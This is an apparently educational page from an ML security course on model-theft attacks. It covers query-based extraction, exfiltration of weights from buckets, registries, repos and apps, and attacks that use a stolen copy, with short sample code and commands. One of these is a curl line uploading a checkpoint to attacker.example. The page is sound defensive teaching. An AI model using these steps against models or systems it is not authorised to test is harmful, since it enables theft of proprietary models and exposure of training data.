# ML05: Model Theft - Attack Vectors

## Table of Contents
- [Understanding Model-Theft Attack Vectors](#understanding-model-theft-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Extraction Attack Patterns](#extraction-attack-patterns)
- [Exfiltration Attack Patterns](#exfiltration-attack-patterns)
- [Using a Stolen Model](#using-a-stolen-model)
- [Chaining the Attacks](#chaining-the-attacks)

## Understanding Model-Theft Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in models and systems you own or are authorised to test.

Model theft splits cleanly into two families. **Extraction** attacks treat the model as a black box and reconstruct its behaviour from its answers—the attacker never needs the file. **Exfiltration** attacks go after the artifact directly—the weights sitting in storage, a registry, a repo, or a shipped device. A third stage, **using the stolen model**, turns either kind of copy into further attacks against the original.

The attacker's goal in this category is usually one of:

- Reproduce the model's decision boundary closely enough to replace it or compete with it.
- Obtain a white-box copy that makes offline adversarial, inversion, and membership-inference attacks cheap.
- Acquire, for the price of some queries or a misconfigured bucket, the expensive data-and-compute investment the model represents.

### Core Attack Flow

```
1. Select target & route
   ↓
   Prediction API reachable?  -> EXTRACTION
   Artifact reachable?        -> EXFILTRATION
2. Harvest
   ↓
   Collect (query, response) pairs  |  pull weights / unpack device
3. Reconstruct
   ↓
   Train substitute / distill       |  load stolen checkpoint
4. Exploit
   ↓
   Compete, craft transferable adversarial, invert, infer membership
```

## Extraction Attack Patterns

### 1. Label-Only Extraction

The API returns only the top-1 class, but that is still a labelling oracle. The attacker submits many inputs—public data, synthetic samples, or points chosen near the boundary—and trains a substitute on the labels.

```python
X = sample_input_space(n=100_000)          # public + synthetic inputs
y = [target_api.predict(x)["label"] for x in X]   # hard labels only
substitute = train_classifier(X, y)        # clones the boundary from labels
```

**Payoff**: a functional copy even when the API is deliberately terse. More queries are needed than in the confidence-based case, but no exotic access is required.

### 2. Confidence / Logit-Based Distillation

When the API returns a probability vector or logits, each response is a *soft label* that reveals how close the input was to the boundary—far more information per query.

```python
resp = target_api.predict(x)               # {"probs": [0.02, 0.91, 0.07]}
soft_labels.append(resp["probs"])
# Knowledge distillation: match the victim's probability distribution
loss = KL_divergence(student(x), soft_labels)
```

**Payoff**: dramatically higher fidelity per query and far fewer queries to reach a usable clone. Returning logits is the most generous case of all.

### 3. Boundary-Probing / Active-Query Extraction

Rather than sampling blindly, the attacker concentrates queries where the model is uncertain, refining the decision boundary with the fewest calls.

```python
# Binary-search along the line between two differently-classified points
while distance(a, b) > eps:
    m = midpoint(a, b)
    if target_api.predict(m)["label"] == label_a: a = m
    else: b = m
boundary_points.append(m)                  # precise boundary samples
```

**Payoff**: query-efficient extraction; the systematic, near-boundary access pattern is also a key detection signal for defenders.

### 4. Functionality / Task Extraction of Large Models

Against modern deep models, the same distillation idea scales: use the target as a teacher to label a large corpus and train a student that inherits the capability.

```python
corpus = large_unlabeled_pool()
teacher_outputs = [target_api.predict(x) for x in corpus]   # victim as teacher
student = distill(corpus, teacher_outputs)                  # inherits behaviour
```

**Payoff**: a cheaper substitute that captures most of the target's useful behaviour without the original training data or compute.

## Exfiltration Attack Patterns

### 5. Exposed Object Storage

Weights are large files, and large files are often parked in object storage with permissions that are too broad.

```http
GET https://victim-models.s3.amazonaws.com/         # public bucket lists objects
- Bucket ACL: "AllUsers" / "AuthenticatedUsers" read
- Objects: model-final.pt, weights.bin, saved_model/
-> download the checkpoint directly
```

**Payoff**: a byte-for-byte white-box copy with no interaction with the live service.

### 6. Unauthenticated Model Registry or Artifact Store

Internal registries and artifact servers are frequently reachable without authentication.

```http
GET http://registry.internal:5000/v2/_catalog          # lists model images
GET http://mlflow.internal/api/2.0/mlflow/artifacts/... # anonymous artifact pull
GET http://minio.internal/models/prod/model.onnx        # open bucket gateway
```

**Payoff**: full checkpoints and their configs, pulled anonymously.

### 7. Weights Committed to a Repository

Checkpoints get committed "temporarily," and the repo (or a fork, or its history) becomes reachable.

```bash
git clone https://host/ml-service.git
git log --all --stat | grep -Ei '\.(pt|pth|onnx|h5|ckpt|safetensors|bin)$'
git checkout <old-commit> -- models/model-final.pt     # recover from history
```

**Payoff**: the artifact and often the training config, recoverable even after deletion from the latest commit.

### 8. Model Served as a Static File

A misplaced route or a permissive web root serves the weights like any other asset.

```http
GET https://app.example.com/static/models/model.onnx   # 200 OK, downloads weights
GET https://app.example.com/assets/model.tflite
```

**Payoff**: the model is one predictable URL away; scanners find these paths automatically.

### 9. On-Device / Mobile Model Extraction

A model shipped for offline inference is present inside every copy of the app or firmware.

```bash
unzip app.apk -d app/                         # Android package
find app/ -name '*.tflite' -o -name '*.pt' -o -name '*.onnx'
# iOS: extract .mlmodel from the app bundle; firmware: carve the model blob
```

**Payoff**: the artifact ends up on the attacker's device; light obfuscation delays but does not prevent recovery.

### 10. Insider and Pipeline Exfiltration

The most direct route is authorised access used for an unauthorised copy.

```bash
scp train-host:/checkpoints/model-final.pt ./     # employee/contractor copy
# or: a compromised CI job uploads the checkpoint to an attacker-controlled store
curl -T model-final.pt https://attacker.example/upload
```

**Payoff**: the complete artifact leaves a well-guarded environment through a trusted identity.

## Using a Stolen Model

A copy—extracted or exfiltrated—is not the end goal; it is a platform for further attacks against the still-deployed original.

### 11. Transferable Adversarial Examples

Adversarial examples crafted against the local copy frequently *transfer* to the original because both models learned similar boundaries.

```python
# White-box gradient attack on the STOLEN copy, offline and free
adv = x + eps * sign(grad_x(loss(stolen_model(x), wrong_label)))
target_api.predict(adv)   # often misclassified by the ORIGINAL too
```

**Payoff**: evasion of the production model (fraud, spam, content filters) developed entirely offline.

### 12. Model Inversion and Membership Inference

With a local white-box copy, privacy attacks that are noisy and rate-limited against an API become cheap and unlimited offline.

```python
# Inversion: optimise an input to maximise a class score -> representative sample
# Membership: compare the model's confidence on a candidate record to a threshold
was_in_training = stolen_model.confidence(record) > tau
```

**Payoff**: reconstruction of representative training inputs and confirmation of specific records—a direct privacy breach traceable to the theft.

## Chaining the Attacks

Individually modest weaknesses combine into full model compromise:

```
No auth on inference API      -> unlimited queries
        +
API returns full logits       -> high-fidelity distillation, few queries
        =  a near-exact substitute at low cost
```

Another common chain:

```
Weights committed to a repo    -> white-box copy of the model
        -> craft transferable adversarial examples offline
        -> evade the production API at will
        -> run model inversion to recover sensitive training data
```

## Key Takeaways

1. **Two routes, defend both**—behaviour is cloned by querying; the artifact is stolen from storage, repos, or devices.
2. **Output granularity is the throttle**—logits and full probability vectors make extraction cheap; hard, rounded labels make it expensive.
3. **Systematic querying is a signal**—boundary-probing and high-volume access patterns are detectable if you look.
4. **Shipped and stored artifacts leak**—public buckets, open registries, committed weights, and on-device files are all direct white-box theft.
5. **A stolen copy is a weapon**—it powers transferable adversarial, inversion, and membership-inference attacks against the original.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build a layered defence for the API and the artifact
- **[Code Examples](examples.md)**: Insecure vs. secure inference APIs and model storage
- **[ML Security Learning Path](/learn/ml)**: Continue with the rest of the OWASP ML Top 10
- **[Practice](/practice)**: Apply these defences in hands-on exercises
